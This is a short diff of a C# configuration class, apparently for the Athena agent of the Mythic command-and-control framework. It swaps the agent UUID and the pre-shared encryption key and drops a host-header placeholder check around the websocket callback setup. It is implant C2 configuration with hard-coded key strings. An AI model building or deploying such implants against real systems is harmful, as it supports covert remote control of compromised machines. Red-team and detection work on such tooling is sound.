@@ -20,7 +20,7 @@ namespace Athena.Config
 
         public MythicConfig()
         {
-            this.uuid = "5e85a280-56e1-4ead-9009-bed73fa6bccd";
+            this.uuid = "405c8116-3df1-4180-8c8f-fedba7bba428";
             DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
             this.killDate = kd;
             int sleep = int.TryParse("10", out sleep) ? sleep : 60;
@@ -56,7 +56,7 @@ namespace Athena.Config
             string callbackURL = $"{callbackHost}:{callbackPort}/{this.endpoint}";
             this.userAgent = "test";
             this.hostHeader = "test";
-            this.psk = "wprxxRr4dtD0UgrMqTQ0Rs3CyFHaM6swdOZAoS7//U4=";
+            this.psk = "uZBo42yntp9a4VWuk2J17qq5u0G5wSQyi5ORu/oymuo=";
             this.encryptedExchangeCheck = bool.Parse("false");
             if (!string.IsNullOrEmpty(this.psk))
             {
@@ -66,7 +66,7 @@ namespace Athena.Config
 
             this.ws = new ClientWebSocket();
 
-            if (!String.IsNullOrEmpty(this.hostHeader) && this.hostHeader != "%HOSTHEADER%")
+            if (!String.IsNullOrEmpty(this.hostHeader))
             {
                 this.ws.Options.SetRequestHeader("Host", this.hostHeader);
             }
